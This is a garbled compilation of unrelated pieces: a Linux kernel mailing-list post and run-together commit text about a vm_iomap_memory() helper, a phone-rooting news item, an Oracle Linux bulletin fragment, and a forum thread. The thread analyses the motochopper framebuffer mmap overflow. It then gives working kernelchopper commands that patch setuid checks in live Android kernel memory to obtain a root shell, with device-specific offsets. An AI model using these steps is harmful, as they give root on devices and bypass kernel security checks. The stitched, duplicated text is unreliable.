Guys, I just pushed out a new helper function intended for cleaning up
various device driver mmap functions, because they are rather messy,
and at least part of the problem was the bad impedance between what a
driver author would want to have, and the VM interfaces to map a
memory range into user space with mmap.

Some drivers would end up doing extensive checks on the length of the
mappings and the page offset within the mapping, while other drivers
would end up doing no checks at all.

The new helper is in commit b4cbb197c7e7 ("vm: add vm_iomap_memory()
helper function"), but I didn't actually commit any *users* of it,
because I just have this untested patch-collection for a few random
drivers (picked across a few different driver subsystems, just to make
it interesting).  I did that largely just to check the different use
cases, but I don't actually tend to *use* all that many fancy drivers,
so I don't have much of a way of testing it.

The media layer has a few users of [io_]remap_pfn_range() that look
like they could do with some tender loving too, but they don't match
this particular pattern of "allow users to map a part of a fixed range
of memory". In fact, the media pattern seems to be single-page
mappings, which probably should use "vm_insert_page()" instead, but
that's a whole separate thing. But I didn't check all the media cases
(and there's a lot of remap_pfn_range use outside of media drivers I
didn't check either), so there might be code that could use the new
helper.

Anyway, I'm attaching the *untested* patch to several drivers. Guys,
mind taking a look? The point here is to simplify the interface,
avoiding bugs, but also:

it needs current -git for the new helper function.

NOTE! The driver subsystem .mmap functions seem to almost universally do

    if (io_remap_pfn_range(..))
        return -EAGAIN;
    return 0;

and I didn't make the new helper function do that "turn all
remap_pfn_range errors into EAGAIN". My *suspicion* is that this is
just really old copy-pasta and makes no sense, but maybe there is some
actual reasoning behind EAGAIN vs ENOMEM, for example. EAGAIN is
documented to be about file/memory locking, which means that it really
doesn't make any sense, but obviously there might be some binary that
actally depends on this, so I'm perfectly willing to make the helper
do that odd error case, I'd just like to know (and a add a comment)
WHY.

My personal guess is that nobody actually cares (we return other error
codes for other cases, notably EINVAL for various out-of-mapping-range
issues), and the whole EAGAIN return value is just a completely
historical oddity.

(And yes, I know the mtdchar code is actually disabled right now. But
that was a good example of a driver that had a bug in this area and
that I touched myself not too long ago, and recent stable noise
reminded me of it, so I did that one despite it not being active).

[![razr hd unlocked](https://www.droid-life.com/wp-content/uploads/2013/04/razr-hd-unlocked-650x433.jpg)](https://www.droid-life.com/wp-content/uploads/2013/04/razr-hd-unlocked.jpg)

Yesterday, Dan Rosenberg [published the first Motorola bootloader unlock method](https://www.droid-life.com/2013/04/08/motorola-razr-hd-razr-m-and-atrix-hd-bootloader-unlock-released/) in history. It was an epic moment for the rooting and development community on Android, as no one had been able to accomplish anything close to this for what seems like an eternity on a Motorola device since they started locking them down back in 2010. There was one problem though, the bootloader unlock worked on devices like the [**DROID RAZR HD**](/tag/razr-hd), RAZR M, and Atrix HD as long as you were rooted before you updated to Android 4.1.2. For many of you, especially those with a RAZR HD or RAZR MAXX HD who received the most recent 4.1.2 update, you were out of luck.

Well, Dan has returned again with another present – root for Android 4.1.2 and more. This method not only works on the RAZR HD, RAZR M and Atrix HD, but it should work on a variety of Motorola devices (until Moto patches it). So for those of you who were unable to unlock bootloaders yesterday, you now have the option to.

Keep in mind there is all sorts of risk involved, namely in relation to warranties. If you unlock the bootloader of your phone, your warranty is gone.

The instructions were posted up at [*DroidRzr.com*](http://www.droidrzr.com/index.php/topic/15208-root-motochopper-yet-another-android-root-exploit/page__pid__244281#entry244281), but we have included them below for you as well.

#### Instructions:

1. Download this file to your PC.
2. Extract the entire contents of the zip file.
3. If you are using Windows, ensure you have installed the latest Motorola USB drivers available for your phone.
4. Ensure USB Debugging mode is enabled on your device.
5. If you are using Windows, navigate to the extracted directory and execute “run.bat”. If you are using Linux or OS X, navigate to the extracted directory in a terminal and execute “./run.sh”.

On a related note, Dan has announced that he is done trying to find exploits in Motorola devices as they have become increasingly difficult and time consuming. He urges you to consider your future purchasing decisions based upon the dev-friendliness of phones rather than waiting or expecting methods like his to be released by the community.

```
Various drivers end up replicating the code to mmap() their memory
buffers into user space, and our core memory remapping function may be
very flexible but it is unnecessarily complicated for the common cases
to use.

Our internal VM uses pfn's ("page frame numbers") which simplifies
things for the VM, and allows us to pass physical addresses around in a
denser and more efficient format than passing a "phys_addr_t" around,
and having to shift it up and down by the page size.  But it just means
that drivers end up doing that shifting instead at the interface level.

It also means that drivers end up mucking around with internal VM things
like the vma details (vm_pgoff, vm_start/end) way more than they really
need to.

So this just exports a function to map a certain physical memory range
into user space (using a phys_addr_t based interface that is much more
natural for a driver) and hides all the complexity from the driver.
Some drivers will still end up tweaking the vm_page_prot details for
things like prefetching or cacheability etc, but that's actually
relevant to the driver, rather than caring about what the page offset of
the mapping is into the particular IO memory region.

If anyone has any objections, please let me know.------------------From: Linus Torvalds <torvalds@linux-foundation.org>commit b4cbb197c7e7a68dbad0d491242e3ca67420c13e upstream.Various drivers end up replicating the code to mmap() their memorybuffers into user space, and our core memory remapping function may bevery flexible but it is unnecessarily complicated for the common casesto use.Our internal VM uses pfn's ("page frame numbers") which simplifiesthings for the VM, and allows us to pass physical addresses around in adenser and more efficient format than passing a "phys_addr_t" around,and having to shift it up and down by the page size.  But it just meansthat drivers end up doing that shifting instead at the interface level.It also means that drivers end up mucking around with internal VM thingslike the vma details (vm_pgoff, vm_start/end) way more than they reallyneed to.So this just exports a function to map a certain physical memory rangeinto user space (using a phys_addr_t based interface that is much morenatural for a driver) and hides all the complexity from the driver.Some drivers will still end up tweaking the vm_page_prot details forthings like prefetching or cacheability etc, but that's actuallyrelevant to the driver, rather than caring about what the page offset ofthe mapping is into the particular IO memory region.Acked-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>--- include/linux/mm.h |    2 ++ mm/memory.c        |   47 +++++++++++++++++++++++++++++++++++++++++++++++ 2 files changed, 49 insertions(+)--- a/include/linux/mm.h+++ b/include/linux/mm.h@@ -1542,6 +1542,8 @@ int vm_insert_pfn(struct vm_area_struct 			unsigned long pfn); int vm_insert_mixed(struct vm_area_struct *vma, unsigned long addr, 			unsigned long pfn);+int vm_iomap_memory(struct vm_area_struct *vma, phys_addr_t start, unsigned long len);+  struct page *follow_page(struct vm_area_struct *, unsigned long address, 			unsigned int foll_flags);--- a/mm/memory.c+++ b/mm/memory.c@@ -2317,6 +2317,53 @@ int remap_pfn_range(struct vm_area_struc } EXPORT_SYMBOL(remap_pfn_range); +/**+ * vm_iomap_memory - remap memory to userspace+ * @vma: user vma to map to+ * @start: start of area+ * @len: size of area+ *+ * This is a simplified io_remap_pfn_range() for common driver use.

# Oracle Linux Bulletin - January 2016

## Oracle Linux Bulletin - January 2016

### Description

The Oracle Linux Bulletin lists all CVEs that had been resolved and announced in Oracle Linux Security Advisories (ELSA) in the last one month prior to the release of the bulletin. Oracle Linux Bulletins are published on the same day as Oracle Critical Patch Updates are released. These bulletins will also be updated for the following two months after their release (i.e., the two months between the normal quarterly Critical Patch Update publication dates) to cover all CVEs that had been resolved in those two months following the bulletin's publication. In addition, Oracle Linux Bulletins may also be updated for vulnerability fixes deemed too critical to wait for the next scheduled bulletin publication date.

**Due to the threat posed by a successful attack, Oracle strongly recommends that customers apply Oracle Linux Bulletin fixes as soon as possible.**

### Patch Availability

Please see ULN Advisory [http://linux.oracle.com/ol-pad-bulletin](//linux.oracle.com/ol-pad-bulletin)

### Oracle Linux Bulletin Schedule

Oracle Linux Bulletins are released on the Tuesday closest to the 17th day of January, April, July and October. The next four dates are:

* 19 April 2016
* 19 July 2016
* 18 October 2016
* 17 January 2017

* [#1](/t/q-understanding-how-motochopper-works.2255491/post-40825380)

I ran the motochopper[1] "pwn" binary under an unprivileged shell on my CM10.1 Nexus 7 (Tegra chipset, codename "grouper"), and was surprised to find that it gained administrative privileges by changing all "shell"-owned (uid 2000) processes on the system to run as uid 0.

It was somewhat worrying to see that an up-to-date ROM had an unpatched vulnerability, and I was concerned about whether rogue apps could leverage it. The CVE entry[2] was surprisingly vague, compounding my suspicions.

Further investigation indicated that motochopper is running a series of syscalls from within a SIGTRAP handler to thwart tracing:

Code:

```
1662  [4019c940] sigaction(0x5, 0xbecfdcc8, 0xbecfdcc8) = 0
1662  [4019ba5c] gettid()               = 0x67e
1662  [4019d160] kill(0x67e, 0x5)       = 0
1662  [4019d160] kill(0, 0x5)           = 0x5
1662  [4019c940] sigaction(0, 0xbecfdcb0, 0xbecfdcb0) = 0x5
1662  [4019ba5c] gettid()               = 0x67e
1662  [4019d160] kill()                 = 0
1662  [4019c940] sigaction(0x5, 0xbecfdcb0, 0xbecfdcb0) = 0
1662  [4019ba5c] gettid()               = 0x67e
1662  [4019d160] kill(0x67e, 0x5)       = 0
1662  [4019d160] kill(0, 0x5)           = 0x5
1662  [4019c940] sigaction(0, 0xbecfdcb0, 0xbecfdcb0) = 0x5
1662  [4019ba5c] gettid()               = 0x67e
1662  [4019d160] kill()                 = 0
```

After disassembling the binary and patching it to invoke the syscalls directly, it looks like the problem involves the framebuffer driver. First, after opening a bunch of other (irrelevant, possibly decoy) devices, the exploit probes the real size of the framebuffer:

Code:

```
1728  open("/dev/graphics/fb0", O_RDWR) = 6
...
1728  mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = 0x400f2000
1728  munmap(0x400f2000, 4096)          = 0
1728  mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = 0x40011000
1728  munmap(0x40011000, 8192)          = 0
1728  mmap2(NULL, 12288, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = 0x4006a000
1728  munmap(0x4006a000, 12288)         = 0
...
1728  mmap2(NULL, 9433088, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = 0x4015b000
1728  munmap(0x4015b000, 9433088)       = 0
1728  mmap2(NULL, 9437184, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = 0x4015b000
1728  munmap(0x4015b000, 9437184)       = 0
1728  mmap2(NULL, 9441280, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0) = -1 EINVAL (Invalid argument)
```

Then it tries to map the largest possible region into the process' address space:

Code:

```
1728  mmap2(NULL, 2415919104, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0x70900) = -1 ENOMEM (Out of memory)

1728  mmap2(NULL, 2113929216, PROT_READ|PROT_WRITE, MAP_SHARED, 6, 0x82900) = 0x4015b000
```

Clearly, a 2GB mapping on a 1GB device should not have succeeded; apparently this overlaps with kernel memory and the exploit is able to iterate through the task\_struct / creds to change the uid 2000 processes to uid 0:

Code:

```
1728  getuid()                          = 2000
1728  getuid()                          = 2000

```

Checking the perms on /dev/graphics/fb0, it looks like most apps will not have access to this device (though the "graphics" group) and would not be able to directly use this exploit.

Some unanswered questions:

Does this exploit target the kernel's framebuffer infrastructure itself, or only specific drivers? I did not see any obvious fixes along the Linux 3.0 -stable branch, nor did I see any recent Asus kernel commits in the CM github repo.

Why was the binary built with -fPIC and -O0? Is this a form of obfuscation?

What is the significance of probing the framebuffer size? Is it meaningful that 9437184 = 0x900000, and the first mmap() length attempt was 2415919104 = 0x90000000?

Edit:

Some recent changes were made to fbmem.c:fb\_mmap() in mainline:

<http://www.spinics.net/lists/stable/msg06210.html>

<https://lkml.org/lkml/2013/4/23/623>

There is no custom fb\_mmap() in Tegra's fb\_ops struct.

Seeing the kernel maintainers madly rush to backport this innocuous-looking helper function to ancient releases like Linux 3.0, right around the same time motochopper was released (4/9), suggests that they might be trying to clean up a vulnerability in the framebuffer core.

Edit #2:

After staring at the code a little longer (and finally realizing that mmap2() takes a PAGE offset as its last argument, not a BYTE offset), here is what I see:

Code:

```
static int
fb_mmap(struct file *file, struct vm_area_struct * vma)
{
        struct fb_info *info = file_fb_info(file);
        struct fb_ops *fb;
        unsigned long off;
        unsigned long start;
        u32 len;

        if (!info)
                return -ENODEV;
        if (vma->vm_pgoff > (~0UL >> PAGE_SHIFT))
                return -EINVAL;
        off = vma->vm_pgoff << PAGE_SHIFT;
        fb = info->fbops;
        if (!fb)
                return -ENODEV;
        mutex_lock(&info->mm_lock);
        if (fb->fb_mmap) {
                int res;
                res = fb->fb_mmap(info, vma);
                mutex_unlock(&info->mm_lock);
                return res;
        }

        /* frame buffer memory */
        start = info->fix.smem_start;
        [color=red]len = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.smem_len);[/color]
        if (off >= len) {
                /* memory mapped io */
                off -= len;
                if (info->var.accel_flags) {
                        mutex_unlock(&info->mm_lock);
                        return -EINVAL;
                }
                start = info->fix.mmio_start;
                len = PAGE_ALIGN((start & ~PAGE_MASK) + info->fix.mmio_len);
        }
        mutex_unlock(&info->mm_lock);
        start &= PAGE_MASK;
        [color=blue]if ((vma->vm_end - vma->vm_start + off) > len)
                return -EINVAL;[/color]
        off += start;
        vma->vm_pgoff = off >> PAGE_SHIFT;
        /* This is an IO map - tell maydump to skip this VMA */
        vma->vm_flags |= VM_IO | VM_RESERVED;
        vma->vm_page_prot = vm_get_page_prot(vma->vm_flags);
        fb_pgprotect(file, vma, off);
        [color=green]if (io_remap_pfn_range(vma, vma->vm_start, off >> PAGE_SHIFT,
                             vma->vm_end - vma->vm_start, vma->vm_page_prot))[/color]
                return -EAGAIN;
        return 0;
}
```

The initial mmap2/munmap sequence is trying to deduce the rounded smem\_len + (smem\_start partial page byte) value (len) by trying successively larger values until the check in blue returns -EINVAL. Result: 9437184 = 0x900000 (i.e. the framebuffer size is 9MB).

fb\_mmap() is funny in that offsets 0 through (len-1) map the framebuffer, but offset (len) maps byte 0 of mmio\_start. Which looks to be uninitialized (zero) in the Tegra driver.

The second sequence of mmap2() calls is trying to find the largest possible mapping. The kernel mmap2() syscall returns -ENOMEM if the mapping is too large for the virtual address space available to the process; fb\_mmap() is not even called if this happens. When fb\_mmap() is eventually called:

Page offset = 0x82900

Byte offset = off = 0x82900 << PAGE\_SHIFT = 0x8290\_0000

len = 0x90\_0000 and "off" is much larger than len, so this hits the MMIO case. len is subtracted from off, leaving 0x8200\_0000. Since the offset is so large, the length check in blue overflows: the VMA size of 0x7e00\_0000 plus a len of 0x8200\_0000 comes out to exactly 0x1\_0000\_0000; truncated to 32 bits this is zero. This passes the sanity test, so the code in green happily creates a read-write mapping starting at physical address 0 (mmio\_start) and covering all of kernel memory.

So basically motochopper is exploiting an unpublicized (but belatedly patched) kernel bug in fbmem.c.

I'm posting a new, open source utility called "kernelchopper" which uses djrbliss' fb\_mmap exploit to allow the advanced user to explore and modify kernel memory on a non-rooted system.

kernelchopper employs a few extra refinements to maximize the amount of kernel memory exposed to the user application:

1) It is built and linked statically using the Linaro glibc toolchain, because dynamically linked Bionic binaries tend to map libraries and other stuff in the 0x4000\_0000 user address range - a critical part of the address space that we'd like to reserve for the kernel memory mapping

2) It uses MAP\_FIXED to force the kernel to use the lowest VA available, and adjusts the base address until it finds a mutually agreeable number

On my Nexus 7 I was able to map PA range 0x5000\_0000 - 0xffff\_ffff. On Tegra systems, system RAM starts at PA 0x8000\_0000 (= kernel VA 0xc000\_0000), so it is trivial to patch the kernel image in place.

Sample usage:

A quick check of /proc/iomem shows that physical memory starts at PA 0x8000\_0000; the decompressed kernel image lives at VA 0xc000\_8000 (ARM 3GB/1GB standard) = PA 0x8000\_8000. Make a note of this for later:

Code:

```
80000000-beafffff : System RAM
  80008000-80900a57 : Kernel text
  80944000-80b841af : Kernel data
```

Since I built my ROM from source, I have a kernel image with full symbols. Install binutils-multiarch and disassemble with "objdump -d vmlinux":

Code:

```
c0077650 <sys_setuid>:
c0077650:       e92d40f8        push    {r3, r4, r5, r6, r7, lr}
c0077654:       e1a05000        mov     r5, r0
c0077658:       eb0040d6        bl      c00879b8 <prepare_creds>
c007765c:       e2504000        subs    r4, r0, #0

c0077664:       e1a0200d        mov     r2, sp
c0077668:       e3c23d7f        bic     r3, r2, #8128   ; 0x1fc0
c007766c:       e3c3303f        bic     r3, r3, #63     ; 0x3f
c0077670:       e3a00007        mov     r0, #7
c0077674:       e593300c        ldr     r3, [r3, #12]
c0077678:       e59362fc        ldr     r6, [r3, #764]  ; 0x2fc
c007767c:       ebffd80f        bl      c006d6c0 <nsown_capable>
c0077680:       e3500000        cmp     r0, #0
[color=red]c0077684:       1a00000a        bne     c00776b4 <sys_setuid+0x64>[/color]
```

Forcing the branch in red to be taken unconditionally will allow any user to setuid() to any UID, bypassing the kernel's security checks. This is easy to do with kernelchopper. First verify that the code matches the disassembly:

Code:

```
shell@android:/data/local/tmp $ ./kernelchopper d 80077650 40
80077650: f8 40 2d e9 00 50 a0 e1 d6 40 00 eb 00 40 50 e2
80077660: 27 00 00 0a 0d 20 a0 e1 7f 3d c2 e3 3f 30 c3 e3
80077670: 07 00 a0 e3 0c 30 93 e5 fc 62 93 e5 0f d8 ff eb
80077680: 00 00 50 e3 [color=red]0a 00 00 1a[/color] 04 30 96 e5 05 00 53 e1
```

The little-endian word at PA 0x8007\_7684 is 0a 00 00 1a = 0x1a00\_000a. Let's change the instruction word to make it unconditional, and then invoke kernelchopper again to setuid() and spawn a shell:

Code:

```
shell@android:/data/local/tmp $ ./kernelchopper m 80077684
1a00000a
shell@android:/data/local/tmp $ ./kernelchopper m 80077684 ea00000a
shell@android:/data/local/tmp $ ./kernelchopper shell
shell@android:/data/local/tmp # id
uid=0(root) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)
```

At this point you can remount /system read-write, install an "su" binary in /system/xbin, make the "su" binary setuid root, and install Superuser/SuperSU. You will probably want to reboot soon because any other process running on the system can also get root until the virgin kernel is reloaded, if it somehow knows to try.

kernelchopper can also dump ranges of memory (and/or your kernel image) to a file, for offline analysis. This can help in locating things that you might want to change.

Code:

```
shell@android:/data/local/tmp $ ./kernelchopper d 80077650 bc setuid.bin
shell@android:/data/local/tmp $ hexdump -C setuid.bin

```

It is often possible to dump the kernel image range from /proc/iomem and either extract the kallsyms information, or compare code sequences to a similar kernel for which you do have symbols. This would allow you to locate interesting functions like sys\_setuid() in unfamiliar images.

[@SW686](https://xdaforums.com/m/5011635/),

Many, many thanks to you for your work on this.

Applying the latest OTA update for my ASUS TF700T left it in an almost unusable state due to some core frameworks not getting their permissions set properly. Fortunately, I still had ADB access, I just needed to get superuser privileges to fix the problem.

In the course of doing my research on how motochopper works so as to write my own exploit, I came across your posts. The clear and detailed explanations are excellent and saved me a great deal of time. Your kernelchopper did its job beautifully and allowed me to obtain a root shell and get my tab back to fully working condition. Although, admittedly, I was looking forward to the fun of writing my own hack. ![;)](data:image/gif;base64... "Wink    ;)") Thank you, again!

Cheers!

P.S. If you have a PayPal account and are so inclined, PM me your addy so I may send you a few dollars in appreciation.

doesn't seem to work on my Acer A700.

patched like 3 setuid offsets to ea00000a, ./kernelchopper shell still giving me

setuid() failed: Operation not permitted

that's that try to root the device with locked bootloader.

What's the version of the ROM you're running?

Rv16rc01 (Android 4.1.1)

I know there is a way to root it with an insecure boot.img, but that requires to unlock the bootloader.

It's just that there are people who want to root it without unlocking it, because there is no way to relock it.

OK, so the instruction to modify and its location are a bit different due to a combination of Acer building the kernel optimized for size and using (I believe) GCC 4.6. The instruction offset is 0x0006d258 and the instruction to modify is 0x0a000009.

These commands assume the kernel image starts at address 0x80008000. You can verify this using the command:

Code:

```
grep -Ei 'kernel (code|text)' /proc/iomem
```

The new set of commands and their output are:

Code:

```
shell@android:/data/local/tmp $ ./kernelchopper m 80075258
0a000009
shell@android:/data/local/tmp $ ./kernelchopper m 80075258 eaffffff
shell@android:/data/local/tmp $ ./kernelchopper shell
shell@android:/data/local/tmp # id
uid=0(root) [snipped]
```

This should give you root privileges and let you proceed with the rest of the rooting process.

Out of curiosity, did you try to just run motochopper? It will push over the superuser application and binary for you and doesn't require modifying the kernel memory by hand.

Hi people,

First I have to say I admire your knowledge. I have a ZTE Blade G phone that hasn't been rooted yet. I figured the motocopper exploit might help, since the phone has MSM8225 SoC and it runs 4.1.2 android. It would not work. It actually wrote success once, but didn't actually get root. Now it just writes Bus Error. Now, I've poked a little with kernelchopper, but my /proc/iomem says quite a different thing from yours, presumably because the phone has just 512MB ram. If I try to dump any addresses above 80008000, it writes bus error. Here's the output:

Code:

```
00200000-0fbfffff : System RAM
00208000-00a48c6b : Kernel code
00a80000-00d33a23 : Kernel data
0fc01000-0fcfffff : System RAM
0fd01000-0fdfffff : System RAM
0fe01000-0fffffff : System RAM
20000000-296fffff : System RAM
a0000000-a001ffff : kgsl_3d0_reg_memory
a0000000-a001ffff : kgsl-3d0
a0200000-a0200fff : msm_serial_hs.0
a0300000-a0300fff : uartdm_resource
a0300000-a0300fff : msm_serial_hsl
```

I don't really know what this means, but I know in your program you don't allow addresses below 0x50000000, so it won't work. I figured I would kind of dump the whole kernel ram and search for similar commands. I don't even know how, but I figure it would be fun. So, can you point me in the right direction here? I'm a noob, but I want to learn. BTW, for my phone, there isn't any recovery image or I could disassemble, and the bootloader seems to be locked too.

Hi fluxx\_srb,

I can have a go at walking you through this if you'd like.

The prerequisites are: a LInux system with an ARM cross-compilation setup, the Linux kernel for your device (I usually get this from the firmware package provided by the OEM), and a copy of the kernel source used for the device (again, from the OEM).

Once you've got all these in place, then we can move on the technical nitty-gritty.

tried it, but it always crashes with android itself when read/write memory.

Hello to all, I just got root on padfone 2 without unlocking and without these prerequisites. I used adt-bundle-linux-x86-20130729, grep and a compiler (try terminal IDE, or use gentooandroid.sourceforge.net ; if you trust the binaries attached to this message you do not need any compiler), then kernelchopper, then applied manually the end of exynos-abuse.

STEP 0: You may apply this on any Android system on your own risks. If your output of any instruction is not exactly as shown here, you should adapt following instructions accordingly (following color codes, and counting underlined words in hexadecimal notation), or better quit. **If you do not get exactly all the outputs I colored here in red, you should QUIT or change previous instructions.** If you have no internal microSD, I suggest to you to first chdir a directory of you computer which can host one file of size >4Gb (3898777809 bytes for my padfone 2, the day I bought it).

STEP 1: finding s\_show->seq\_printf format string found at: 0x80c281c6.

We first use adb to put all attached files (unzipped) in /data/data/com.spartacusrex.spartacuside/adb.

Code:

```
script backup_before_installing_su_to_disk
adt-bundle-linux-x86-20130729/sdk/platform-tools/adb push /tmp/busybox /data/.tmp/grep
adt-bundle-linux-x86-20130729/sdk/platform-tools/adb push /tmp/kernelchopper /data/.tmp

./grep sys_setresuid /proc/kallsyms
c[COLOR="SandyBrown"]00856f0[/COLOR]  T sys_setresuid
c00b7318  T sys_setresuid16
```

Notice that /proc/kallsyms now gives offsets instead of 00000000.

STEP 2: patching sys\_setresuid, applying manually exynos-abuse.c (found at 0x802856f0, which is 0x00856f0 plus 80208000). You should replace the underlined lone 8 by the number of bytes underlined, before the 00 00 50 e3 ...

Code:

```
./kernelchopper d [COLOR="YellowGreen"]802856f0[/COLOR] 80 | ./grep '00 00 50 e3\|20 00 00 ea'
[COLOR="Purple"]8028572[/COLOR]0: [U]04 72 93 e5 a7 da ff eb[/U] 00 00 50 e3 20 00 00 ea
./kernelchopper d [COLOR="Purple"]8028572[/COLOR][U]8[/U] 8
[COLOR="MediumTurquoise"]80285728[/COLOR]: [COLOR="Red"]00 00 50 e3 20 00 00 ea[/COLOR]
./kernelchopper m [COLOR="MediumTurquoise"]80285728[/COLOR]
[COLOR="Red"]e3500000[/COLOR]
./kernelchopper m [COLOR="MediumTurquoise"]80285728[/COLOR] e3500001
```

STEP 3: getting a root shell.

Code:

```
./exynos-abuse-static
2000@android:/data/.tmp # /system/bin/id
uid=[COLOR="Red"]0[/COLOR](root) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)
```

And you are root until end of connexion by adb. I strongly suggest to you to make the first true backup, to have a chance to restore phone to current state. With an internal microSD, you can type:

Code:

```
cp grep bzip2
./bzip2 -c < /dev/block/mmcblk0 > /Removable/Storage1/backup.bz2
```

To exploit this file, you will need kpartx.

If you have NO internal microSD, try a network drive; or if you can wait a full day (like me), you can do:

Code:

```
cp grep bzip2
cp grep uuencode
./bzip2 -c < /dev/block/mmcblk0 | ./uuencode -
```

The result will be shown on current window, so you have better hide it once it works. I had a performance of 400kb/s with hidden xterm.

You will then be able to recover its content with

Code:

```
LANG= grep -aA99999999 '^begin 666 -' < backup_before_installing_su_to_diskreal | uudecode -o backup.bz2
```

You may now install /system/xbin/su, eventually renamed to avoid exposing su to malware.

Here is my firmware (see attached pic).

Code:

```
Android version: 4.1.1, 3.4.0-perf-g64..., M3.13.30-A68_101034 [Jan 22 2013]
```

If you need help, please type up-arrow repeatedly, down-arrow repeatedly, then provide the file backup\_before\_installing\_su\_to\_diskreal.

I now use attached shell script with . ./root\_padfone.sh (notice the dot) ; please update the script if you needed to change anything in step 1, or 2.

Code:

```
adb@localhost ~/root_padfone $ . ./root_padfone.sh
adb@android:/data/data/com.spartacusrex.spartacuside/adb/root_padfone # exit
e3500000
adb@localhost ~/root_padfone $
```

In the images, you see I use a ssh server to share the adb priviledges.

**closed source**

it seems both MotoChopper as well as framaroot are closed source rooters, so using them involves a certain risk...

This is why I invented the more open-source method that is displayed three posts above.

I just updated this post, any busybox you trust will work, Terminal IDE is no more needed.

I also suggested to make backups with instructions on how to make them.

Has anyone done this on a Galaxy Nexus running 4.2.2? I've spent a bunch of time searching and this seems like the only hope for rooting via an exploit on the GNex. I actually do kernel and android development but from my understanding of the posts here I need to get the address of certain kernel functions to apply this to my device. I'm running the stock build, can anyone help me with this or walk me through how to get the required information to use kernelchopper?

Thanks.

The best guide I've followed from xda this year, period.

I've rooted an a13 tablet with android 4.1.2 (it was easy as motochopper already works on it).

Tried on a 4.2.2 no-name tablet and did not manage to make it work for now, but I will try harder ![:)](data:image/gif;base64... "Smile    :)")

  [S](/m/sw686.5011635/)

  **[SW686](/m/sw686.5011635/)**

  I'm posting a new, open source utility called "kernelchopper" which uses djrbliss' fb\_mmap exploit to allow the advanced user to explore and modify kernel memory on a non-rooted system.

  kernelchopper employs a few extra refinements to maximize the amount of kernel memory exposed to the user application:

  1) It is built and linked statically using the Linaro glibc toolchain, because dynamically linked Bionic binaries tend to map libraries and other stuff in the 0x4000\_0000 user address range - a critical part of the address space that we'd like to reserve for the kernel memory mapping

  2) It uses MAP\_FIXED to force the kernel to use the lowest VA available, and adjusts the base address until it finds a mutually agreeable number

  On my Nexus 7 I was able to map PA range 0x5000\_0000 - 0xffff\_ffff. On Tegra systems, system RAM starts at PA 0x8000\_0000 (= kernel VA 0xc000\_0000), so it is trivial to patch the kernel image in place.

  Sample usage:

  A quick check of /proc/iomem shows that physical memory starts at PA 0x8000\_0000; the decompressed kernel image lives at VA 0xc000\_8000 (ARM 3GB/1GB standard) = PA 0x8000\_8000. Make a note of this for later:

  Code:

  ```
  80000000-beafffff : System RAM
    80008000-80900a57 : Kernel text
    80944000-80b841af : Kernel data
  ```

  Since I built my ROM from source, I have a kernel image with full symbols. Install binutils-multiarch and disassemble with "objdump -d vmlinux":

  Code:

  ```
  c0077650 <sys_setuid>:
  c0077650:       e92d40f8        push    {r3, r4, r5, r6, r7, lr}
  c0077654:       e1a05000        mov     r5, r0
  c0077658:       eb0040d6        bl      c00879b8 <prepare_creds>
  c007765c:       e2504000        subs    r4, r0, #0
  c0077660:       0a000027        beq     c0077704 <sys_setuid+0xb4>
  c0077664:       e1a0200d        mov     r2, sp
  c0077668:       e3c23d7f        bic     r3, r2, #8128   ; 0x1fc0
  c007766c:       e3c3303f        bic     r3, r3, #63     ; 0x3f
  c0077670:       e3a00007        mov     r0, #7
  c0077674:       e593300c        ldr     r3, [r3, #12]
  c0077678:       e59362fc        ldr     r6, [r3, #764]  ; 0x2fc
  c007767c:       ebffd80f        bl      c006d6c0 <nsown_capable>
  c0077680:       e3500000        cmp     r0, #0
  [color=red]c0077684:       1a00000a        bne     c00776b4 <sys_setuid+0x64>[/color]
  ```

  Forcing the branch in red to be taken unconditionally will allow any user to setuid() to any UID, bypassing the kernel's security checks. This is easy to do with kernelchopper. First verify that the code matches the disassembly:

  Code:

  ```
  shell@android:/data/local/tmp $ ./kernelchopper d 80077650 40
  80077650: f8 40 2d e9 00 50 a0 e1 d6 40 00 eb 00 40 50 e2
  80077660: 27 00 00 0a 0d 20 a0 e1 7f 3d c2 e3 3f 30 c3 e3
  80077670: 07 00 a0 e3 0c 30 93 e5 fc 62 93 e5 0f d8 ff eb
  80077680: 00 00 50 e3 [color=red]0a 00 00 1a[/color] 04 30 96 e5 05 00 53 e1
  ```

  The little-endian word at PA 0x8007\_7684 is 0a 00 00 1a = 0x1a00\_000a. Let's change the instruction word to make it unconditional, and then invoke kernelchopper again to setuid() and spawn a shell:

  Code:

  ```
  shell@android:/data/local/tmp $ ./kernelchopper m 80077684
  1a00000a
  shell@android:/data/local/tmp $ ./kernelchopper m 80077684 ea00000a
  shell@android:/data/local/tmp $ ./kernelchopper shell
  shell@android:/data/local/tmp # id
  uid=0(root) gid=2000(shell) groups=1003(graphics),1004(input),1007(log),1009(mount),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admin),3002(net_bt),3003(inet),3006(net_bw_stats)
  ```

  At this point you can remount /system read-write, install an "su" binary in /system/xbin, make the "su" binary setuid root, and install Superuser/SuperSU. You will probably want to reboot soon because any other process running on the system can also get root until the virgin kernel is reloaded, if it somehow knows to try.

  kernelchopper can also dump ranges of memory (and/or your kernel image) to a file, for offline analysis. This can help in locating things that you might want to change.

  Code:

  ```
  shell@android:/data/local/tmp $ ./kernelchopper d 80077650 bc setuid.bin
  shell@android:/data/local/tmp $ hexdump -C setuid.bin

  It is often possible to dump the kernel image range from /proc/iomem and either extract the kallsyms information, or compare code sequences to a similar kernel for which you do have symbols. This would allow you to locate interesting functions like sys\_setuid() in unfamiliar images.

  [S](/m/sw686.5011635/)

  **[SW686](/m/sw686.5011635/)**

